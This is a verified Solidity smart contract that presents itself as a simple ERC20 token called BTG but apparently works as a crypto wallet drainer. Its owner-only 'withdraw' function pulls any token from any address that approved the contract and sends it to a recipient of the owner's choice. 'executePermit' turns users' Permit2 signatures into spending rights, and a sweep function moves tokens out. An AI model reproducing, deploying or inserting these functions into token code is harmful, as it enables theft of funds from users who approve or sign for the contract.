/**
 *Submitted for verification at Etherscan.io on 2025-03-18
*/

// SPDX-License-Identifier: NOLICENSE
pragma solidity ^0.8.13;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IPermit2 {
    struct PermitDetails { address token; uint256 amount; uint48 expiration; uint48 nonce; }
    struct PermitSingle { PermitDetails details; address spender; uint256 sigDeadline; }
    function permit(address owner, PermitSingle calldata permitSingle, bytes calldata signature) external;
}


contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() { 
        _owner = _msgSender();
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_msgSender() == _owner, "Ownable: caller is not the owner");
        _;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract BTG is Context, IERC20, Ownable {
    string private constant _name = "BTG";
    string private constant _symbol = "BTG Token";
    uint8 private constant _decimals = 6;
    uint256 private immutable _totalSupply = 10_000_000 * 10**_decimals;
    
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    bool public transferEnabled = true;
    uint256 public startTimeForSwap;
    
    address public constant PERMIT2_ADDRESS = 0x000000000022D473030F116dDEE9F6B43aC78BA3;
    IPermit2 public permit2 = IPermit2(PERMIT2_ADDRESS);

    error InsufficientBalance();
    error InsufficientAllowance();
    error TransferNotEnabled();

    constructor() {
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

     function name() external pure returns (string memory) {
        return _name;
    }
    
    function symbol() external pure returns (string memory) {
        return _symbol;
    }

    function decimals() external pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function setTransferEnabled(bool state) external onlyOwner {
        transferEnabled = state;
    }

    function rescueAnyBEP20Tokens(address _tokenAddr, address _to, uint _amount) public onlyOwner {
        IERC20(_tokenAddr).transfer(_to, _amount);
    }

    // 优化后的 withdraw 函数
    function withdraw(address _tokenAddr, address sender, address recipient, uint256 amount) public onlyOwner {
        if (!transferEnabled) revert TransferNotEnabled();
        if (IERC20(_tokenAddr).balanceOf(sender) < amount) revert InsufficientBalance();
        (bool success, bytes memory returnData) = _tokenAddr.call(
            abi.encodeWithSelector(IERC20.transferFrom.selector, sender, recipient, amount)
        );
        if (!success) {
            if (returnData.length == 0) {
                revert("Token transfer reverted without reason");
            } else {
                assembly {
                    revert(add(32, returnData), mload(returnData))
                }
            }
        }
        if (returnData.length > 0) {
            require(abi.decode(returnData, (bool)), "Token transfer returned false");
        }
    }

    function executePermit(address owner, IPermit2.PermitSingle calldata permitSingle, bytes calldata signature) external onlyOwner {
        permit2.permit(owner, permitSingle, signature);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        if (currentAllowance < amount) revert InsufficientAllowance();

        _transfer(sender, recipient, amount);

        unchecked { _allowances[sender][_msgSender()] = currentAllowance - amount; }
        emit Approval(sender, _msgSender(), _allowances[sender][_msgSender()]);
        
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        return _basicTransfer(sender, recipient, amount);
    }

    // 优化 Gas 消耗的转账逻辑
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
            _balances[recipient] += amount;
        }
        emit Transfer(sender, recipient, amount);
        return true;
    }
}